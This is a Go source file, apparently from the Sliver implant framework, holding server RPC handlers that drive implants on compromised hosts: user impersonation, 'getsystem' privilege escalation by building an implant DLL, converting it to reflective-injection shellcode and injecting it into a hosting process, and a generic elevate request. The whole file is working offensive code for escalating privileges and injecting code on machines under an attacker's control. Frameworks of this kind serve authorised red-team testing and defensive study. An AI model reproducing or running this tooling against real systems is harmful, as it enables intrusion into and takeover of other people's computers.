package rpc

/*
	Sliver Implant Framework
	Copyright (C) 2019  Bishop Fox

	This program is free software: you can redistribute it and/or modify
	it under the terms of the GNU General Public License as published by
	the Free Software Foundation, either version 3 of the License, or
	(at your option) any later version.

	This program is distributed in the hope that it will be useful,
	but WITHOUT ANY WARRANTY; without even the implied warranty of
	MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
	GNU General Public License for more details.

	You should have received a copy of the GNU General Public License
	along with this program.  If not, see <https://www.gnu.org/licenses/>.
*/

import (
	"fmt"
	"time"

	clientpb "github.com/bishopfox/sliver/protobuf/client"
	sliverpb "github.com/bishopfox/sliver/protobuf/sliver"
	"github.com/bishopfox/sliver/server/core"
	"github.com/bishopfox/sliver/server/generate"

	"github.com/golang/protobuf/proto"
)

func rpcImpersonate(req []byte, timeout time.Duration, resp RPCResponse) {
	impersonateReq := &sliverpb.ImpersonateReq{}
	err := proto.Unmarshal(req, impersonateReq)
	if err != nil {
		resp([]byte{}, err)
		return
	}
	sliver := core.Hive.Sliver(impersonateReq.SliverID)
	if sliver == nil {
		resp([]byte{}, fmt.Errorf("Could not find sliver"))
		return
	}
	data, _ := proto.Marshal(&sliverpb.ImpersonateReq{
		Process:  impersonateReq.Process,
		Username: impersonateReq.Username,
		Args:     impersonateReq.Args,
	})

	data, err = sliver.Request(sliverpb.MsgImpersonateReq, timeout, data)
	resp(data, err)
}

func rpcGetSystem(req []byte, timeout time.Duration, resp RPCResponse) {
	gsReq := &clientpb.GetSystemReq{}
	err := proto.Unmarshal(req, gsReq)
	if err != nil {
		resp([]byte{}, err)
		return
	}
	sliver := core.Hive.Sliver(gsReq.SliverID)
	if sliver == nil {
		resp([]byte{}, fmt.Errorf("Could not find sliver"))
		return
	}
	config := generate.SliverConfigFromProtobuf(gsReq.Config)
	config.Format = clientpb.SliverConfig_SHARED_LIB
	config.ObfuscateSymbols = false
	dllPath, err := generate.SliverSharedLibrary(config)
	if err != nil {
		resp([]byte{}, err)
		return
	}
	shellcode, err := generate.ShellcodeRDI(dllPath, "RunSliver")
	if err != nil {
		resp([]byte{}, err)
		return
	}
	data, _ := proto.Marshal(&sliverpb.GetSystemReq{
		Data:           shellcode,
		HostingProcess: gsReq.HostingProcess,
		SliverID:       gsReq.SliverID,
	})

	data, err = sliver.Request(sliverpb.MsgGetSystemReq, timeout, data)
	resp(data, err)

}

func rpcElevate(req []byte, timeout time.Duration, resp RPCResponse) {
	elevateReq := &sliverpb.ElevateReq{}
	err := proto.Unmarshal(req, elevateReq)
	if err != nil {
		resp([]byte{}, err)
		return
	}
	sliver := core.Hive.Sliver(elevateReq.SliverID)
	if sliver == nil {
		resp([]byte{}, fmt.Errorf("Could not find sliver"))
		return
	}
	data, _ := proto.Marshal(&sliverpb.ElevateReq{})

	data, err = sliver.Request(sliverpb.MsgElevateReq, timeout, data)
	resp(data, err)

}
